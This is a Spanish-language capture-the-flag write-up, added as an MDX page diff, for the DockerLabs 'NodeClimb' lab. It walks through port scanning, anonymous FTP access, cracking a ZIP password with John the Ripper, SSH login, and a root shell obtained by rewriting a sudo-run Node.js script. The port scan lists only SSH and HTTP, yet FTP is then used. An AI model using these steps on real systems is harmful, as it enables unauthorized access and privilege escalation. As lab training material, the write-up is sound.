@@ -1,0 +1,199 @@
+---
+title: NodeClimb
+description: Resolución completa de la máquina virtual *NodeClimb* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **NodeClimb**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor FTP con acceso anónimo que contiene un archivo ZIP protegido por contraseña. Tras crackear la contraseña con John the Ripper, se extrae un archivo con credenciales SSH del usuario `mario`.
+Una vez dentro, se identifica un script `script.js` que el usuario puede ejecutar como root mediante `sudo` con Node.js. Al modificar el script para ejecutar una shell, se obtiene acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'NodeClimb',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Fácil',
+    Fecha: '05/07/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip NodeClimb.zip
+sudo bash auto_deplo.sh NodeClimb.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p NodeClimb/{content,exploits,nmap,scripts}
+cd NodeClimb
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1750056309/Ports_bkqtwp.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+![Servicios](https://res.cloudinary.com/dewqswzke/image/upload/v1750056307/Services_u1ydn0.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Acceso anónimo FTP
+
+El servidor FTP permite autenticación anónima, permitiendo listar y descargar archivos sin credenciales:
+
+```bash
+ftp 172.17.0.2
+```
+
+![FTP](https://res.cloudinary.com/dewqswzke/image/upload/v1750056307/Ftp_ifmuan.png)
+
+Se verifica el contenido y se descarga el archivo comprimido:
+
+![LS](https://res.cloudinary.com/dewqswzke/image/upload/v1750056307/Ls_chfzqy.png)
+
+### 2.2 Crackeo del archivo ZIP
+
+El archivo `secretitopicarion.zip` está protegido por contraseña. Se genera el hash con `zip2john`:
+
+```bash
+zip2john secretitopicarion.zip > hash.txt
+```
+
+![Hash](https://res.cloudinary.com/dewqswzke/image/upload/v1750056307/hash_kbmrxm.png)
+
+Se crackea la contraseña con John the Ripper:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+![Cracked](https://res.cloudinary.com/dewqswzke/image/upload/v1750056814/PassHash_dizjov.png)
+
+### 2.3 Acceso SSH
+
+Se extrae el contenido del ZIP y se obtienen credenciales SSH:
+
+![Password](https://res.cloudinary.com/dewqswzke/image/upload/v1750056309/Password_bmzsbf.png)
+
+Se accede al sistema:
+
+```bash
+ssh mario@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1750056307/Ssh_v29pev.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De mario → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1750056307/Sudo-l_chg1xx.png)
+
+El usuario puede ejecutar `/home/mario/script.js` como root con Node.js.
+
+Se modifica el contenido del script para ejecutar una shell:
+
+```js
+process.setuid(0);
+require("child_process").spawn("/bin/sh", { stdio: [0, 1, 2] });
+```
+
+Se ejecuta el script con `sudo`:
+
+```bash
+sudo /usr/bin/node /home/mario/script.js
+```
+
+![Elevate](https://res.cloudinary.com/dewqswzke/image/upload/v1750056307/Elevate_lwgdu7.png)
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1750056307/Root_ck1uw4.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Acceso anónimo a FTP con archivos sensibles",
+      severity: "Alta",
+      impact: "Exposición de archivos protegidos con contraseña débil"
+    },
+    {
+      vulnerability: "Contraseña débil en archivo ZIP",
+      severity: "Media",
+      impact: "Extracción de credenciales mediante fuerza bruta"
+    },
+    {
+      vulnerability: "Credenciales almacenadas en texto plano en archivo extraído",
+      severity: "Crítica",
+      impact: "Compromiso de acceso SSH al sistema"
+    },
+    {
+      vulnerability: "Script Node.js ejecutado por root y modificable por mario",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    }
+  ]}
+/>
